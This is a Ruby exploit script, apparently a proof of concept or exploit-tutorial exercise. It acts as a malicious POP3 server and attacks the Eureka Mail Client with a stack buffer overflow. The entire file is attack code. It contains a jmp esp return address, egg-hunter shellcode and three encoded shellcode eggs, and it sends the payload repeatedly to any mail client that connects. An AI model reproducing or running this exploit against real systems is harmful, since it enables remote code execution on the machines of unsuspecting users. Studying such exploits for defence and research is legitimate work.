#
require 'socket'

localServer = "192.168.0.13"
localPort = "110"

junk = "\x41" * (723 - localServer.size)
ret = "\x53\x93\x42\x7E" # Memory address 0x7E429353  - jmp esp from user32.dll
padding = "\x90" * 1000

# replace the xor edi,edi with two nops -> \x31\xFF\ --> \x90\x90\
omelet_code =  "\xbb\xfd\xff\xff\xff"+              #put 0xfffffffd in ebx
"\xEB\x2C\x51\x64\x89\x20\xFC\xB0\x7A\xF2\xAE\x50"+
"\x89\xFE\xAD\x35\xFF\x55\xDA\xBA\x83\xF8\x03\x77"+
"\x15\x59\xF7\xE9\x64\x03\x42\x08\x97\xF3\xA4"+
"\x81\xFB\xFF\xFF\xFF\xFF"+                         # compare EBX with FFFFFFFF
"\x74\x2B"+                                         #if EBX is FFFFFFFF, jump to shellcode
"\x43"+                                             #if not, increase EBX and continue
"\x89\xF7\x31\xC0\x64\x8B\x08\x89\xCC\x59\x81\xF9"+
"\xFF\xFF\xFF\xFF\x75\xF5\x5A\xE8\xBE\xFF\xFF\xFF"+
"\x61\x8D\x66\x18\x58\x66\x0D\xFF\x0F\x40\x78\x06"+
"\x97\xE9\xD8\xFF\xFF\xFF\x31\xC0\x64\xFF\x50\x08"

egg0 = "\x7A\xFF\x55\xDA\xBA\x89\xE2\xDA\xC1\xD9\x72\xF4\x58\x50\x59\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5A\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4A\x4A\x49\x4B\x4C\x4A\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4C\x4B\x47\x35\x47\x4C\x4C\x4B\x43\x4C\x43\x35\x43\x48\x45\x51\x4A\x4F\x4C\x4B\x50\x4F\x42\x38\x4C\x4B\x51\x4F\x47\x50\x43\x31\x4A\x4B\x51\x59\x4C\x4B\x46\x54\x4C\x4B\x43"
egg1 = "\x7A\xFE\x55\xDA\xBA\x31\x4A\x4E\x50\x31\x49\x50\x4C\x59\x4E\x4C\x4C\x44\x49\x50\x43\x44\x43\x37\x49\x51\x49\x5A\x44\x4D\x43\x31\x49\x52\x4A\x4B\x4A\x54\x47\x4B\x51\x44\x46\x44\x43\x34\x42\x55\x4B\x55\x4C\x4B\x51\x4F\x51\x34\x45\x51\x4A\x4B\x42\x46\x4C\x4B\x44\x4C\x50\x4B\x4C\x4B\x51\x4F\x45\x4C\x45\x51\x4A\x4B\x4C\x4B\x45\x4C\x4C\x4B\x45\x51\x4A\x4B\x4D\x59\x51\x4C\x47\x54\x43\x34\x48\x43\x51\x4F\x46\x51\x4B\x46\x43\x50\x50\x56\x45\x34\x4C\x4B\x47\x36\x50\x30\x4C\x4B\x51\x50\x44\x4C\x4C\x4B\x44\x30\x45"
egg2 = "\x7A\xFD\x55\xDA\xBA\x4C\x4E\x4D\x4C\x4B\x45\x38\x43\x38\x4B\x39\x4A\x58\x4C\x43\x49\x50\x42\x4A\x50\x50\x42\x48\x4C\x30\x4D\x5A\x43\x34\x51\x4F\x45\x38\x4A\x38\x4B\x4E\x4D\x5A\x44\x4E\x46\x37\x4B\x4F\x4D\x37\x42\x43\x45\x31\x42\x4C\x42\x43\x45\x50\x41\x41\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40"

garbage = "This is a bunch of garbage" * 10

payload = junk + ret + omelet_code + padding + egg0 + garbage + egg1 + garbage + egg2

puts "Payload : #{payload.size} bytes"
puts "Omelet code : #{omelet_code.size} bytes"
puts "Egg 0 : #{egg0.size} bytes"
puts "Egg 1 : #{egg1.size} bytes"
puts "Egg 2 : #{egg2.size} bytes"

# Generate files for compare eggs
# File.open("egg0.bin", 'w'){|f| f.write(egg0)}
# File.open("egg1.bin", 'w'){|f| f.write(egg1)}
# File.open("egg2.bin", 'w'){|f| f.write(egg2)}

server = TCPServer.new(localServer, localPort)
puts "[+] Listening on tcp port 110 [POP3]... \n";
puts "[+] Configure Eureka Mail Client to connect to this host\n";

loop do
    client = server.accept
    loop do
        client.puts "-ERR " + payload
        puts " -> Sent #{payload.size} bytes"
    end
    client.close
end
puts "[+] Connection closed"